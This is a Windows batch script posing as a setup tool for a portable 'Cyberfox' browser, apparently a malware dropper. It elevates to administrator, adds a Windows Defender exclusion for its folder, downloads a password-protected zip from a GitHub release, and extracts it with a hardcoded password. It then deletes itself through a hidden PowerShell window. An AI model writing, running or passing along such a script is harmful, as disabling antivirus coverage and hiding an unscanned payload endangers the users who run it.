@echo off
Title Tavir Ahmed
setlocal enabledelayedexpansion

:: Configuration
set "bat_dir=%~dp0"
set "folder=%bat_dir%Cyberfox Portable"
set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
set "winrar_installer=!folder!\WinRAR-free.exe"
set "cyberfox_url=https://github.com/sahmsec/cyberfox/releases/download/v1.0/CyberfoxPortable.zip"
set "cyberfox_zip=!folder!\CyberfoxPortable.zip"
set "password=aws"

:: Header
echo =============================================
echo Cyberfox Environment Setup
echo =============================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [STEP] Requesting administrative privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

:: User confirmation


:: Create Cyberfox Portable folder if it doesn't exist
if not exist "!folder!\" (
    mkdir "!folder!"
    echo [SUCCESS] Created workspace: !folder!
) else (
    echo [INFO] Workspace already exists: !folder!
)

:: Add Defender exclusion for Cyberfox Portable folder
echo [STEP] Adding Defender exclusion for: !folder!
powershell -Command "Try { Add-MpPreference -ExclusionPath '!folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"

:: === WinRAR Detection and Installation ===
set "winrar_exe="

:: Try native 64-bit registry
for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
    set "winrar_exe=%%b"
)

:: Try WOW6432Node
if not defined winrar_exe (
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
)

:: Try legacy path from WinRAR key
if not defined winrar_exe (
    for /f "tokens=3*" %%a in ('reg query "HKLM\SOFTWARE\WinRAR" /v "Path" 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%a\WinRAR.exe"
    )
)

:: If still not found, install WinRAR
if not defined winrar_exe (
    echo [STEP] Downloading latest WinRAR...
    powershell -Command "Invoke-WebRequest -Uri '%winrar_url%' -OutFile '!winrar_installer!'" >nul 2>&1

    echo [STEP] Installing WinRAR...
    start "" /wait "!winrar_installer!" /S
    timeout /t 10 /nobreak >nul
    del "!winrar_installer!" >nul

    :: Re-check registry after install
    for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
        set "winrar_exe=%%b"
    )
    if not defined winrar_exe (
        for /f "tokens=2,*" %%a in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do (
            set "winrar_exe=%%b"
        )
    )
)

:: Fallback
if not defined winrar_exe (
    set "winrar_exe=%ProgramFiles%\WinRAR\WinRAR.exe"
)

:: Final verification
echo [INFO] Verifying WinRAR at: !winrar_exe!
if not exist !winrar_exe! (
    echo [ERROR] WinRAR not found at: !winrar_exe!
    echo [ACTION] Please install WinRAR manually and re-run this script.
    exit /b
)

:: === Download Cyberfox ZIP ===
echo [STEP] Downloading Cyberfox package...
powershell -Command "Invoke-WebRequest -Uri '%cyberfox_url%' -OutFile '%cyberfox_zip%' -UseBasicParsing" >nul 2>&1
if exist "%cyberfox_zip%" (
    echo [SUCCESS] Cyberfox package downloaded
) else (
    echo [ERROR] Failed to download Cyberfox package
    exit /b
)

:: === Extract Cyberfox ZIP ===
echo [STEP] Extracting Cyberfox package...
start "" /wait "!winrar_exe!" x -ibck -p"%password%" "%cyberfox_zip%" "!folder!\" >nul 2>&1

if %errorlevel% equ 0 (
    echo [SUCCESS] Extraction completed successfully
) else (
    echo [ERROR] Extraction failed with code %errorlevel%
    exit /b
)

:: Delete ZIP after extraction
del /f /q "%cyberfox_zip%"
echo [INFO] Deleted Cyberfox ZIP file

:: Open Cyberfox Portable folder
start explorer "!folder!"

:: Launch silent deletion in background (runs independently)
start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"

:: Close terminal immediately
exit
